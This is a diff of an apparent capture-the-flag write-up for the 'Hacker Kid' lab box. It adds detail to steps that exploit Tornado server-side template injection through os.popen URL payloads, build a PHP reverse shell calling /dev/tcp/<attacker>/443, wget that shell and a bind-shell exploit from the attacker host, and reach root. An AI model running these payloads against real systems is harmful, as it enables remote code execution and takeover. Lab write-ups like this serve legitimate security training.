@@ -335,7 +335,9 @@ http://hackerkid.blackhat.local:9999/?name=thoseguys
 
 Lets see what we can do with this one.
 
-We notice that it is vulnerable to SSTI using this.
+Bit of a search for `tornado exploit` in your fav search engine should give you some info and lead you to find that [Tornado is vulnerable](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/) to SSTI.
+
+We confirm that this setup is vulnerable to SSTI using this.
 {% raw %}
 ```
 http://hackerkid.blackhat.local:9999?name={%import%20os%}{{os.popen(%22whoami%22).read()}}
@@ -345,25 +347,36 @@ http://hackerkid.blackhat.local:9999?name={%import%20os%}{{os.popen(%22whoami%22
 
 This gives us back saket which is the user we noted in the passwd file.
 
-On our local machine we can use python to server up our trusty php reverse shell. Copy a simple rev.php shell to the local directory and then run a server.
+So we could use this to give us a reverse shell in the SSTI but when we tried it only ran as www-data so lets skip straight to using SSTI to wget a reverse shell and then run that.
+
+So lets create a reverse shell php file locally.
+```
+touch rev.php
+vim rev.php
+```
+```
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker>/443 0>&1'");?>
+```
+
+And now we can serve that up via a quick python server.
 
 ```
 python3 -m http.server 8000
 ```
 
-Then use our SSTI to run wget and download it.
+Then use our SSTI to run wget and download the reverse shell to `/tmp/rev.php`.
 {% raw %}
 ```
-http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.popen(%22wget%20http://192.168.1.162:8000/rev.php%20-O%20/tmp/rev.php%22).read()}}
+http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.popen(%22wget%20http://<attacker>:8000/rev.php%20-O%20/tmp/rev.php%22).read()}}
 ```
 {% endraw %}
-Lets set up our listener with netcat.
+Lets set up our listener with netcat on our kali machine.
 
 ```
 nc -nlvp 443
 ```
 
-and now simply run that rev.php file directly using the php cli.
+and now simply run that `rev.php` file directly using the php cli in our SSTI exploit.
 {% raw %}
 ```
 http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.system(%22php%20/tmp/rev.php%22)}}
@@ -404,9 +417,20 @@ root         945       1  0 07:37 ?        00:00:01 /usr/sbin/apache2 -k start
 ```
 
 According to the article we need to spin up a BIND shell. so lets go look one up..
-[gist BIND shell](https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py)
 
-We use wget again to transfer it to the box and run it with python2
+On kali lets get that a BIND shell.
+```
+wget https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py -O exploit.py
+```
+
+Then use our SSTI to run wget and download the `exploit.py` to `/tmp/exploit.py` on our target.
+{% raw %}
+```
+http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.popen(%22wget%20http://<attacker>:8000/exploit.py%20-O%20/tmp/exploit.py%22).read()}}
+```
+{% endraw %}
+
+And now back into our shell and lets run that python file.
 
 ```
 saket@ubuntu:/tmp$ which python
@@ -447,7 +471,7 @@ BOOOM
 Now lets connect and see what happens
 
 ```
-c -nv 192.168.1.165 5600
+c -nv $TARGETIP 5600
 (UNKNOWN) [192.168.1.165] 5600 (?) open
 whoami
 root
